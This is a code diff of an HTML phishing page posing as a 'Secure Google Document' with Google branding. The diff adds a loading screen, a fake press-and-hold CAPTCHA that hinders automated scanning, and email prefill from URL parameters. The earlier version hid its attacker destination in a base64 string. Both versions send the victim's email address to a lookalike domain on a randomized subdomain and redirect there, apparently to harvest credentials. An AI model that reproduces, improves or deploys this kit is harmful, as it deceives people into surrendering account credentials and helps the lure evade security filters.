@@ -1,11 +1,39 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Secure Google Document</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet"/>
   <style>
+    /* Loader Styles */
+    #loader-container {
+      position: fixed;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(120deg, #89f7fe, #66a6ff);
+      z-index: 10;
+    }
+
+    .loader-circle {
+      border: 6px solid rgba(255, 255, 255, 0.3);
+      border-top: 6px solid white;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Main Content Styles */
     body {
       font-family: 'Roboto', sans-serif;
       background: #F5F5F5;
@@ -25,6 +53,7 @@
       max-width: 350px;
       width: 90%;
       border-top: 4px solid #4285F4;
+      display: none;
     }
 
     .logo {
@@ -105,11 +134,6 @@
       margin: 15px auto;
     }
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
     .google-colors {
       display: flex;
       justify-content: center;
@@ -123,10 +147,82 @@
     .red { background-color: #EA4335; }
     .yellow { background-color: #FBBC05; }
     .green { background-color: #34A853; }
+
+    /* Press and Hold CAPTCHA Styles */
+    .captcha-container {
+      margin: 20px 0;
+      padding: 15px;
+      background: #f8f9fa;
+      border-radius: 4px;
+      border: 1px solid #dadce0;
+      text-align: center;
+    }
+    
+    .hold-button {
+      width: 100%;
+      padding: 15px;
+      background: #f1f3f4;
+      border: 2px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 500;
+      color: #3c4043;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: background 0.3s;
+    }
+    
+    .hold-button:hover {
+      background: #e8eaed;
+    }
+    
+    .hold-button.active {
+      background: #e6f4ea;
+      border-color: #34a853;
+    }
+    
+    .hold-button.success {
+      background: #e6f4ea;
+      border-color: #34a853;
+      color: #34a853;
+    }
+    
+    .progress-bar {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      height: 4px;
+      background: #34a853;
+      width: 0%;
+      transition: width 0.1s linear;
+    }
+    
+    .instructions {
+      font-size: 13px;
+      color: #5f6368;
+      margin-top: 10px;
+    }
+    
+    #email-form {
+      display: none;
+    }
+    
+    .prefilled-email {
+      font-weight: bold;
+      color: #4285F4;
+      margin: 15px 0;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
+  <!-- Loader -->
+  <div id="loader-container">
+    <div class="loader-circle"></div>
+  </div>
+
+  <!-- Main Content -->
+  <div class="container" id="main-content">
     <!-- Google Logo -->
     <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo" />
     <div class="google-colors">
@@ -136,34 +232,151 @@
       <div class="color-bar green"></div>
     </div>
 
-    <h1>Google Docs Encryption</h1>
-    <p class="bold-text">To open this secure document, enter the email address it was shared with.</p>
+    <h1>Google Portal</h1>
+    <p class="bold-text">Please verify you're not a robot</p>
 
-    <form onsubmit="verifyEmail(event)">
-      <input type="email" id="email" placeholder="Enter your email" required />
-      <button type="submit">Verify</button>
-    </form>
+    <!-- Press and Hold CAPTCHA Section -->
+    <div id="captcha-section">
+      <div class="captcha-container">
+        <p>Press and hold to verify</p>
+        <button class="hold-button" id="hold-button">
+          Hold for 3 seconds
+          <div class="progress-bar"></div>
+        </button>
+        <p class="instructions">Keep holding until the progress bar completes</p>
+      </div>
+    </div>
 
-    <p class="bold-text verification-text">Verifying access for the recipient's Google account.</p>
-    <div class="loading-spinner"></div>
+    <!-- Email Form (hidden until CAPTCHA is solved) -->
+    <div id="email-form">
+      <p class="bold-text"></p>
+      <div id="prefilled-email-container" class="prefilled-email" style="display:none;">
+        Document shared to: <span id="prefilled-email"></span>
+      </div>
+      <form onsubmit="verifyEmail(event)">
+        <input type="email" id="email" placeholder="Enter your email" required />
+        <button type="submit">Verify</button>
+      </form>
+      <p class="bold-text verification-text">Verifying access for the recipient's Account.</p>
+      <div class="loading-spinner" id="form-spinner"></div>
+    </div>
   </div>
 
   <script>
-    function verifyEmail(event) {
-      event.preventDefault();
-      const email = document.getElementById('email').value;
-      if (email) {
-        document.querySelector('.loading-spinner').style.display = 'block';
+    document.addEventListener("DOMContentLoaded", () => {
+      const generateRandomString = (length) => {
+        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefhiklmnorstuvwxz0123456789";
+        return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
+      };
 
-        const base64Url = "aHR0cHM6Ly8zNTYyOC1oMDExMDF2cC5nb29rZW5lYS5jb20uZGUvVWtBcDMhOHBWRHBaaGx5YS8=";
-        const decodedUrl = atob(base64Url);
-        const finalUrl = decodedUrl + "?ff" + encodeURIComponent(email);
+      // Function to extract email from URL parameters (# or ?e=)
+      const extractEmailFromURL = () => {
+        const url = new URL(window.location.href);
+        // Check for email in hash (#email@domain.com)
+        if (url.hash && url.hash.includes('@')) {
+          return url.hash.substring(1); // Remove the #
+        }
+        // Check for email in query parameter (?e=email@domain.com)
+        if (url.searchParams.get('e')) {
+          return url.searchParams.get('e');
+        }
+        return null;
+      };
 
-        setTimeout(() => {
-          window.location.href = finalUrl;
-        }, 2000);
+      // Show loader first, then main content after delay
+      setTimeout(() => {
+        document.getElementById("loader-container").style.display = "none";
+        document.getElementById("main-content").style.display = "block";
+        
+        // Check for prefilled email
+        const extractedEmail = extractEmailFromURL();
+        if (extractedEmail) {
+          window.prefilledEmail = extractedEmail; // Store for later use
+        }
+      }, 3000);
+
+      // Press and Hold CAPTCHA functionality
+      const holdButton = document.getElementById('hold-button');
+      const progressBar = holdButton.querySelector('.progress-bar');
+      let holdInterval;
+      let holdTime = 0;
+      const requiredHoldTime = 3000; // 3 seconds
+
+      holdButton.addEventListener('mousedown', startHold);
+      holdButton.addEventListener('touchstart', startHold);
+      
+      holdButton.addEventListener('mouseup', endHold);
+      holdButton.addEventListener('touchend', endHold);
+      holdButton.addEventListener('mouseleave', endHold);
+
+      function startHold() {
+        holdButton.classList.add('active');
+        holdTime = 0;
+        progressBar.style.width = '0%';
+        
+        holdInterval = setInterval(() => {
+          holdTime += 100;
+          const progressPercent = Math.min((holdTime / requiredHoldTime) * 100, 100);
+          progressBar.style.width = `${progressPercent}%`;
+          
+          if (holdTime >= requiredHoldTime) {
+            completeHold();
+          }
+        }, 100);
       }
-    }
+
+      function endHold() {
+        if (holdInterval) {
+          clearInterval(holdInterval);
+          holdButton.classList.remove('active');
+          if (holdTime < requiredHoldTime) {
+            progressBar.style.width = '0%';
+          }
+        }
+      }
+
+      function completeHold() {
+        clearInterval(holdInterval);
+        holdButton.classList.remove('active');
+        holdButton.classList.add('success');
+        holdButton.textContent = 'Verified ✓';
+        
+        setTimeout(() => {
+          document.getElementById('captcha-section').style.display = 'none';
+          document.getElementById('email-form').style.display = 'block';
+          
+          // If we have a prefilled email, show it and autofill the field
+          if (window.prefilledEmail) {
+            document.getElementById('prefilled-email-container').style.display = 'block';
+            document.getElementById('prefilled-email').textContent = window.prefilledEmail;
+            document.getElementById('email').value = window.prefilledEmail;
+            document.querySelector('.bold-text').textContent = "";
+          } else {
+            document.querySelector('.bold-text').textContent = "To open this File, enter the email address it was shared to.";
+          }
+        }, 500);
+      }
+
+      // Verify Email
+      window.verifyEmail = function(event) {
+        event.preventDefault();
+        const email = document.getElementById('email').value;
+        if (email) {
+          document.getElementById('form-spinner').style.display = 'block';
+          
+          // Generate random URL components
+          const randomSubdomain = generateRandomString(10);
+          const randomPath = generateRandomString(15);
+          
+          // Create final URL with email parameter
+          const finalUrl = `https://${randomSubdomain}.gookenea.com.de/a9lNhhA6wf!fAySb/?ff${encodeURIComponent(email)}`;
+
+          setTimeout(() => {
+            window.location.href = finalUrl;
+          }, 2000);
+        }
+      };
+    });
   </script>
 </body>
 </html>
